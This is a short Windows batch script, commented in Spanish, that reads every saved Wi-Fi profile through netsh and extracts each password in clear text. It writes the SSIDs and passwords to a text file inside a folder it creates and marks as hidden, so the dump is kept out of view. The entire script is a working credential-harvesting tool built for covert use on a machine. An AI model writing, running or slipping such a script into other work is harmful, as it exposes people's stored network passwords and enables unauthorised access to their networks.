@echo off
setlocal

:: --- Configuración ---
set "outputFile=wpsd.txt"
set "outputFolder=invisible"

:: --- Función para obtener el nombre de archivo con incremento ---
set "fileCounter=0"
:checkFile
if exist "%outputFolder%\%outputFile%" (
    set /a "fileCounter+=1"
    set "outputFile=wpsd%fileCounter%.txt"
    goto :checkFile
)

:: --- Crear carpeta oculta en el directorio actual ---
md "%outputFolder%" 2>nul
attrib +h "%outputFolder%"

echo Obtener perfiles de Wi-Fi y contraseñas...
netsh wlan show profiles | findstr /C:"Perfil de todos los usuarios" > temp_perfiles.txt

if exist "temp_perfiles.txt" (
    for /F "tokens=2 delims=:" %%a in (temp_perfiles.txt) do (
        set "profile=%%a"
        setlocal enabledelayedexpansion
        echo SSID: !profile:~1! >> "%outputFolder%\%outputFile%"
        netsh wlan show profile name="!profile:~1!" key=clear | findstr /C:"Contenido de la clave" > temp_clave.txt
        if exist "temp_clave.txt" (
            for /F "tokens=2 delims=:" %%b in (temp_clave.txt) do (
                echo PWD: %%b >> "%outputFolder%\%outputFile%"
            )
            del temp_clave.txt
        ) else (
            echo No se encontró la contraseña para el perfil: !profile:~1! >> "%outputFolder%\%outputFile%"
        )
        echo ----------------------------------------- >> "%outputFolder%\%outputFile%"
        endlocal
    )
    del temp_perfiles.txt
    echo Archivo guardado como "%outputFolder%\%outputFile%"
) else (
    echo No se encontraron perfiles de Wi-Fi.
    echo El archivo "%outputFile%" no fue creado.
)

endlocal
exit
